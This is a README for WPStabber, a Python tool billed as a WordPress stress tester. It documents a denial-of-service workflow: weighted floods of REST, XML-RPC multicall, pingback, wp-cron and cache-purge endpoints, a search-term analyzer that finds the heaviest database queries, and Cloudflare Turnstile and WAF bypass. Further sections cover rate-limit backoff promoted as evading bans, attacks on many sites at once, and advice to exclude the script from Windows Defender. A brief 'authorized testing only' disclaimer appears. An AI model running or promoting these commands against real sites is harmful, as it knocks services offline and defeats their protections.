<h1 align="center">WPStabber</h1>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue" alt="platform" />
  <img src="https://img.shields.io/badge/python-3.8+-green" alt="python" />
  <br>
  <em>WordPress Stress Testing Framework for Security Hardening.
    <br>Multi-vector testing tool with Cloudflare bypass capabilities.</em>
  <br>
</p>

<p align="center">
  <a href="#installation"><strong>Installation</strong></a>
  ·
  <a href="#quick-start"><strong>Quick Start</strong></a>
  ·
  <a href="#attack-vectors"><strong>Attack Vectors</strong></a>
  ·
  <a href="#search-analyzer"><strong>Search Analyzer</strong></a>
</p>

<hr>

```
█     █░ ██▓███    ██████ ▄▄▄█████▓ ▄▄▄       ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
▓█░ █ ░█░▓██░  ██▒▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒█░ █ ░█ ▓██░ ██▓▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░█░ █ ░█ ▒██▄█▓▒ ▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░░██▒██▓ ▒██▒ ░  ░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ▓░▒ ▒  ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒ ░ ░  ░▒ ░     ░ ░▒  ░ ░    ░      ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
  ░   ░  ░░       ░  ░  ░    ░        ░   ▒    ░    ░  ░    ░    ░     ░░   ░ 
    ░                   ░                 ░  ░ ░       ░         ░  ░   ░     
                                                    ░       ░                 
```

> ⚠️ **FOR AUTHORIZED PENETRATION TESTING ONLY**
> 
> Only use on systems you have explicit written permission to test.

## Documentation

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Multi-Target Mode](#multi-target-mode)
- [Attack Vectors](#attack-vectors)
- [Auto-Probe](#auto-probe)

### Advanced

- [Search Analyzer](#search-analyzer)
- [Cloudflare Bypass](#cloudflare-bypass)
- [Custom Search Terms](#custom-search-terms)
- [Output Indicators](#output-indicators)
- [Scaling for Multi-Target](#scaling-for-multi-target)

## Installation

### Requirements

- Python 3.8+
- pip

### Quick Install
```bash
pip install requests

# Optional - for --bypass mode (live browser CF bypass)
pip install selenium webdriver-manager
```

### Files

| File | Description |
|------|-------------|
| `wpstabber_win.py` | Windows version (threading, 800 workers) |
| `wpstabber_linux.py` | Linux version (multiprocessing, 16×50=800) |
| `search_analyzer.py` | Find heavy DB query terms |
| `search_terms_multilingual.txt` | Basic search terms (11 languages) |
| `search_terms_massive.txt` | 2,430 terms across 14 categories |

## Quick Start

### Basic Test (No Cloudflare)
```bash
# Windows
python wpstabber_win.py -t "https://target.com" --no-cookies

# Linux
python3 wpstabber_linux.py -t "https://target.com" --no-cookies
```

### Multi-Target Test
```bash
# Windows
python wpstabber_win.py -L targets.txt --no-cookies

# Linux
python3 wpstabber_linux.py -L targets.txt --no-cookies
```

### With Cloudflare (Static Cookie)
```bash
python wpstabber_win.py -t "https://target.com" -c "cf_clearance=YOUR_COOKIE"
```

### With Cloudflare (Live Browser Bypass)
```bash
python wpstabber_win.py -t "https://target.com" --bypass
```

## Multi-Target Mode

Test multiple WordPress sites simultaneously from a single command using `-L` / `--targets-file`.

### Targets File Format

Create a text file with one URL per line. Blank lines and `#` comments are ignored. Bare domains are auto-prefixed with `https://`.

```text
# targets.txt - production sites
https://site1.com
https://site2.com/blog
site3.com
# site4.com  ← skipped (commented out)
https://site5.com
```

### Usage
```bash
# Windows - basic multi-target
python wpstabber_win.py -L targets.txt --no-cookies

# Linux - multi-target with adaptive throttling
python3 wpstabber_linux.py -L targets.txt --no-cookies -a

# Windows - multi-target with more threads and 60s duration
python wpstabber_win.py -L targets.txt --no-cookies -T 2000 -d 60

# Linux - multi-target with more processes
python3 wpstabber_linux.py -L targets.txt --no-cookies -p 32
```

### How It Works

1. **Connectivity check** — verifies all targets are reachable, with the option to skip failures
2. **Per-target probing** — each site gets its own vector discovery
3. **Per-target baselining** — independent baseline response times
4. **Thread/process distribution** — workers are split evenly across targets
5. **Simultaneous attack** — all targets are hit at once
6. **Live dashboard** — one row per target with real-time stats and a combined total

### Live Dashboard Output
```
Time  | Target              Reqs      RPS | Home       API       | Impact
──────────────────────────────────────────────────────────────────────────────
  12s | site1.com            4,521     376 |   0.45s(200)   0.32s(200) | STRESSED +78%
  12s | site2.com/blog       3,892     324 |   1.23s(200)   0.98s(200) | 🔥 SEVERE +312%
  12s | site3.com            4,103     341 |   0.12s(200)   0.09s(200) | HOLDING +15%
      TOTAL                 12,516   1,041
```

### Final Report

After stopping (Ctrl+C or `--duration`), a per-target breakdown is printed:

```
  PER-TARGET BREAKDOWN

[1] https://site1.com
    Threads:     267
    Requests:    22,431
    Avg RPS:     374
    Baseline:    0.253s
    Peak:        1.892s
    Degradation: +648%

[2] https://site2.com/blog
    ...
```

### Notes

- `-t` (single target) and `-L` (multi-target) are mutually exclusive
- Cookies set via `-c`, `--bypass`, or `--no-cookies` are shared across all targets
- Adaptive throttling (`-a`) works independently per target — if one site rate-limits you, only that site's threads back off

## Auto-Probe

Before attacking, WPStabber automatically probes all WordPress endpoints to detect which vectors are available:

```
[*] Probing attack vectors...
    wp_cron          ✓
    rest_posts       ✓
    rest_pages       ✓
    rest_media       ✓
    rest_users       ✗ 403
    rest_comments    ✓
    xmlrpc           ✓
    admin_ajax       ✓
    search           ✓
    feed             ✓
    litespeed        ✗ 404

[+] 9/11 vectors available
```

Only **available** vectors are used during the attack. Blocked endpoints (403/404) are automatically skipped.

In multi-target mode, each target is probed independently — vectors available on one site won't affect another.

## Attack Vectors

### WordPress REST API (Heaviest)

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `rest_posts_embed` | 4x | `/wp-json/wp/v2/posts?_embed&per_page=100` | **Maximum** - Full post serialization with embedded data |
| `rest_pages_embed` | 4x | `/wp-json/wp/v2/pages?_embed&per_page=100` | **Maximum** - Full page serialization |
| `rest_media` | 2x | `/wp-json/wp/v2/media?per_page=100` | Media library enumeration |
| `rest_users` | 2x | `/wp-json/wp/v2/users?per_page=100` | User enumeration |
| `rest_comments` | 1x | `/wp-json/wp/v2/comments?per_page=100` | Comment loading |
| `rest_categories` | 1x | `/wp-json/wp/v2/categories?per_page=100` | Taxonomy queries |
| `rest_tags` | 1x | `/wp-json/wp/v2/tags?per_page=100` | Tag enumeration |

### WordPress Core

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `wp_cron` | 3x | `/wp-cron.php?doing_wp_cron=...` | PHP process spawning, scheduled tasks |
| `search` | 3x | `/?s=term+random` | DB `LIKE '%term%'` queries |
| `search_long` | 2x | `/?s={100 random chars}` | Heavy fulltext search load |
| `feed` | 1x | `/feed/` | RSS/Atom generation |

### XML-RPC

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `xmlrpc_multicall` | 2x | `/xmlrpc.php` (system.multicall × 50) | **Brutal** - 50 auth attempts per request |
| `xmlrpc_pingback` | 1x | `/xmlrpc.php` (pingback.ping) | SSRF/callback flood |

### Additional Vectors

| Vector | Weight | Endpoint | Impact |
|--------|--------|----------|--------|
| `admin_ajax` | 2x | `/wp-admin/admin-ajax.php` | Heartbeat/action flood |
| `litespeed` | 1x | `/?LSCWP_CTRL=purge` | LiteSpeed cache purge |
| `nginx_purge` | 1x | `/purge/*` + PURGE method | Nginx FastCGI/proxy cache |
| `apache_mod` | 1x | `/?nocache=` + headers | Apache mod_cache bypass |

## Features

| Feature | Description |
|---------|-------------|
| **Auto-Probe** | Detects available endpoints before attack |
| **Multi-Target** | Test multiple sites simultaneously from a file (`-L`) |
| **15 Attack Vectors** | REST API, XML-RPC, WP-Cron, Search, Cache purge |
| **800 Concurrent Workers** | Maximum stress (configurable) |
| **Cloudflare Bypass** | Live browser with auto cookie refresh |
| **Weighted Vectors** | Heaviest endpoints hit more frequently |
| **Real-time Monitoring** | Live RPS, response times, degradation |
| **Per-Target Dashboard** | Independent stats per target in multi-target mode |
| **Multilingual Search** | 2,430 terms in 11 languages |

## Search Analyzer

Find which search terms cause the heaviest database load:

```bash
# Auto-discover from site content
python search_analyzer.py -t "https://target.com" --auto -o heavy.txt

# Test with massive term list
python search_analyzer.py -t "https://target.com" --terms search_terms_massive.txt
```

### Output
```
    ╔╗ ╦  ╔═╗╔═╗╔╦╗  ╔╦╗╔═╗╦═╗╔╦╗╔═╗
    ╠╩╗║  ║ ║║ ║ ║║   ║ ║╣ ╠╦╝║║║╚═╗
    ╚═╝╩═╝╚═╝╚═╝═╩╝   ╩ ╚═╝╩╚═╩ ╩╚═╝

Rank   Term                    Avg Time    vs Baseline
────────────────────────────────────────────────────────
1      smartphone               2.45s        8.2x ☠️  LETHAL
2      比较                     1.89s        6.3x 🩸 HEAVY
3      обзор смартфон          1.52s        5.1x 🩸 HEAVY
```

### Attack with Heavy Terms
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --search-file heavy.txt
```

## Cloudflare Bypass

### Method 1: Static Cookie
```bash
# 1. Open target in Chrome → Solve Turnstile
# 2. DevTools → Application → Cookies → copy cf_clearance
python wpstabber_win.py -t "https://target.com" -c "cf_clearance=VALUE"
```

### Method 2: Live Browser (Recommended)
```bash
# Browser opens, solve Turnstile once, auto-refreshes every 5 min
python wpstabber_win.py -t "https://target.com" --bypass
```

## Custom Search Terms

### From File
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --search-file search_terms_massive.txt
```

### Included Term Files

**`search_terms_massive.txt`** - 2,430 terms across:
- 🖥️ Technology
- 💊 Health & Wellness  
- 💰 Finance & Banking
- ₿ Cryptocurrency
- 🛒 E-commerce
- ✈️ Travel
- 🍕 Food & Recipes
- 🎮 Gaming
- 🎓 Education
- 🏠 Real Estate
- 💼 Jobs & Careers
- 🚗 Automotive
- 💄 Beauty & Fashion
- ⚽ Sports

**Languages:** 🇬🇧 EN · 🇨🇳 ZH · 🇪🇸 ES · 🇮🇳 HI · 🇸🇦 AR · 🇧🇷 PT · 🇷🇺 RU · 🇯🇵 JA · 🇫🇷 FR · 🇩🇪 DE · 🇮🇹 IT

## Adaptive Mode

When rate limited by Cloudflare (429/529), the tool can automatically scale down requests and ramp back up when the limit lifts.

### Enable Adaptive Mode
```bash
python wpstabber_win.py -t "https://target.com" --no-cookies --adaptive
python wpstabber_win.py -t "https://target.com" --no-cookies -a  # Short flag
```

### How It Works

| Status | Action | Throttle Change |
|--------|--------|-----------------|
| **429 / 529** | Backoff | +0.5s delay (max 5s) |
| **200 / 5xx** | Ramp up | -0.1s delay |

The throttle indicator shows current delay:
```
  45s   52,384     164 | 0.89s(429) 0.45s(200) | ⏱️  429 RATE LIMITED 📉2.5s
  46s   52,548      64 | 0.92s(529) 0.48s(200) | 🔥 CF ERROR 1015 📉3.0s
  47s   52,612      64 | 0.34s(200) 0.21s(200) | ✓ RATE LIMIT LIFTED
  48s   53,876   1,264 | 0.89s(200) 0.45s(200) | STRESSED +263%
```

In multi-target mode, adaptive throttling is **independent per target** — one site getting rate-limited won't slow down attacks on other sites.

### Benefits
- **Evades permanent bans** - backs off before triggering hard blocks
- **Maximizes throughput** - ramps up as soon as rate limit lifts
- **Continuous testing** - maintains pressure without manual intervention
- **Smart scaling** - automatically finds the sustainable RPS

## Output Indicators

| Status | HTTP | Meaning |
|--------|------|---------|
| `HOLDING` | 200 | Server stable (<50% degradation) |
| `STRESSED` | 200 | 50-100% degradation |
| `⚠️ DEGRADED` | 200 | 100-200% degradation |
| `🔥 SEVERE` | 200 | 200-500% degradation |
| `☢️ NUCLEAR` | 200 | 500%+ degradation |
| `☠️ DOWN` | 502/0 | Server down or timeout (>30s) |
| `🛡️ BLOCKED` | 403 | Cloudflare WAF block |
| `⏱️ RATE LIMITED (429)` | 429 | Standard rate limiting |
| `🔥 CF ERROR 1015` | 529 | Cloudflare Error 1015 - Rate limited |
| `✓ RATE LIMIT LIFTED` | 200 | Rate limiting stopped, back to normal |

## Options Reference

| Flag | Description | Default |
|------|-------------|---------|
| `-t, --target` | Single target URL | — |
| `-L, --targets-file` | File with target URLs (one per line) | — |
| `-c, --cookies` | Cookie string | None |
| `--bypass` | Live browser mode | Off |
| `--no-cookies` | Run without cookies | Off |
| `-T, --threads` | Thread count (Win) / threads per process (Linux) | 800 / 50 |
| `-p, --processes` | Process count (Linux only) | 16 |
| `-d, --duration` | Auto-stop seconds | 0 (manual) |
| `--search-file` | Load terms from file | None |
| `-a, --adaptive` | Auto-throttle on rate limit | Off |

> **Note:** `-t` and `-L` are mutually exclusive. One of them is required.

## Scaling for Multi-Target

Workers are distributed evenly across targets. When testing many sites, scale up your total worker count to maintain per-target pressure.

### Windows (`-T` total threads)

| Targets | Recommended | Example |
|---------|-------------|---------|
| 1 | `-T 800` (default) | `wpstabber_win.py -t site.com -T 800` |
| 3–4 | `-T 2000` to `-T 2500` | `wpstabber_win.py -L targets.txt -T 2000` |
| 8+ | `-T 4000`+ | `wpstabber_win.py -L targets.txt -T 4000` |

**Windows tips:**
- Widen ephemeral port range in admin PowerShell: `netsh int ipv4 set dynamicport tcp start=1025 num=64000`
- 4000 threads ≈ 4GB+ RAM from stacks alone
- Windows Defender can silently tank throughput — consider excluding the script directory

### Linux (`-p` processes × `-T` threads each)

| Targets | Recommended | Example |
|---------|-------------|---------|
| 1–3 | `-p 16 -T 50` (default, 800 total) | `wpstabber_linux.py -t site.com` |
| 4–8 | `-p 32 -T 50` (1,600 total) | `wpstabber_linux.py -L targets.txt -p 32` |
| 10+ | `-p 48 -T 50`+ (2,400+ total) | `wpstabber_linux.py -L targets.txt -p 48` |

**Linux tips:**
- Raise file descriptor limit: `ulimit -n 65535`
- Widen port range: `sysctl -w net.ipv4.ip_local_port_range="1024 65535"`
- Linux handles high concurrency more cleanly than Windows — prefer it for 10+ targets

## Recommended Workflow

### Single Target
```bash
# 1. Find heavy search terms
python search_analyzer.py -t "https://test.com" --auto -o heavy.txt

# 2. Baseline test (unhardened)
python wpstabber_win.py -t "https://test.com" --no-cookies --search-file heavy.txt -d 60

# 3. Apply hardening (WP-Cron, rate limits, WAF rules)

# 4. Retest
python wpstabber_win.py -t "https://test.com" --no-cookies --search-file heavy.txt -d 60

# 5. Compare degradation metrics, deploy to production
```

### Multi-Target
```bash
# 1. Create target list
echo -e "https://site1.com\nhttps://site2.com\nhttps://site3.com" > targets.txt

# 2. Test all sites simultaneously for 120 seconds
python wpstabber_win.py -L targets.txt --no-cookies -T 2400 -a -d 120

# 3. Review per-target breakdown in final report
# 4. Apply hardening to weakest sites, retest
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| **403 Blocked** | Use `--bypass` or fresh `cf_clearance` cookie |
| **Low RPS** | Increase `-T 1000`, check bandwidth |
| **Memory Issues** | Reduce `-p 8` and `-T 25` (Linux) or `-T 400` (Windows) |
| **Browser won't open** | `pip install selenium webdriver-manager` |
| **Port exhaustion (Windows)** | Run `netsh int ipv4 set dynamicport tcp start=1025 num=64000` as admin |
| **Too many open files (Linux)** | Run `ulimit -n 65535` before launching |
| **Multi-target low per-site RPS** | Scale up total workers: `-T 2000`+ (Win) or `-p 32`+ (Linux) |

## Legal

⚠️ **This tool is for authorized security testing only.**

- Only test systems you own or have written permission to test
- Unauthorized testing is illegal and unethical
- The authors are not responsible for misuse

---

<p align="center">
  <strong>WPStabber</strong>
</p>
